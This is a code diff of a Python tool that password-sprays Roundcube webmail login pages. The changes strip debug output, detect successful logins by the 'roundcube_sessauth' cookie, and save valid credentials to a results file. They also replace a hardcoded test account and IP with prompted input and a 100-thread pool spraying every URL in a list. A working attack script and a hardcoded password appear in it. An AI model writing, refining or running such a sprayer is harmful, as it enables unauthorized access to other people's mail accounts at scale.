@@ -24,8 +24,6 @@ class Sprayer(object):
         self.pbar = None
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; HarmonyOS; AGS3K-W09; HMSCore 6.10.4.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Safari/537.36",
-            "referer": "https://www.google.com",
-            "origin": "https://www.google.com"
 
         }
     def normalize_urls(self):
@@ -62,7 +60,6 @@ class Sprayer(object):
             # because different languages won't have the same "The installer is disabled!" message.
         except Exception as err:
             # failed to request, exit.
-            print(err)
             self.pbar.update()
             return
         
@@ -79,8 +76,6 @@ class Sprayer(object):
             
             '''
             request_token = req.text.split('"request_token":"', 1)[1].split('"', 1)[0].strip().rstrip()
-            
-            print(f"{Fore.GREEN}[ Token ]: {request_token}")
 
             headers = self.headers
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
@@ -96,32 +91,29 @@ class Sprayer(object):
                 "_pass": self.password,
             }
 
-            print(url)
             # try logging in now
             req = session.post(
                 url=url,
                 headers=headers,
                 data=data,
-                verify=False
+                verify=False,
+                allow_redirects=False
             )
             # by status code we can see if it failed or succeeded & by the returned cookie name
-            for some reason valid logins for me are 200 and no cookie returned, but not in burpsuitem
-                figure out why because a != 401 is gonna give 100000 false positives ! 
-            if req.status_code != 401 and 'roundcube_sessauth' in f"{req.cookies}":
+            # for some reason valid logins for me are 200 and no cookie returned, but not in burpsuitem
+            #     figure out why because a != 401 is gonna give 100000 false positives ! 
+            if 'roundcube_sessauth' in f"{req.cookies}":
                 print(f"{Fore.GREEN}[ {self.username}:{self.password}({url}) ]")
                 self.lock.acquire()
-                self.results_file(f"[ {self.username}:{self.password}({url}) ]\n")
+                self.results_file.write(f"[ {self.username}:{self.password}({url}) ]\n")
                 self.results_file.flush()
                 self.lock.release()
                 self.pbar.update()
                 return
 
-            print(f"{Fore.YELLOW}{req.status_code}\n{req.cookies}")
-            print(f"{Fore.RED}[ Login Failed ! ]")
-            open("test.html", 'wb').write(req.content)
+            # print(f"{Fore.RED}[ Login Failed ! ]")
             self.pbar.update()
         except Exception as err:
-            print(f"{err}")
             # some sort of exception was thrown
             self.pbar.update()
 
@@ -129,15 +121,11 @@ class Sprayer(object):
         self.normalize_urls()
         self.pbar = tqdm(total=len(self.urls), desc="Checking...")
 
-        # self.username = input(f"[ Username to spray ]: ").strip().rstrip()
-        # self.password = input(f"[ Password to spray ]: ").strip().rstrip()
+        self.username = input(f"[ Username to spray ]: ").strip().rstrip()
+        self.password = input(f"[ Password to spray ]: ").strip().rstrip()
 
-        self.username = "ubuntu"
-        self.password = "WEEDr0ckwws123!"
-
-        self.login(f"http://198.18.2.187/roundcubemail")
-        # with ThreadPoolExecutor(max_workers=100) as executor:
-        #     executor.map( self.login, self.urls )
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            executor.map( self.login, self.urls )
         self.results_file.close()
 
 
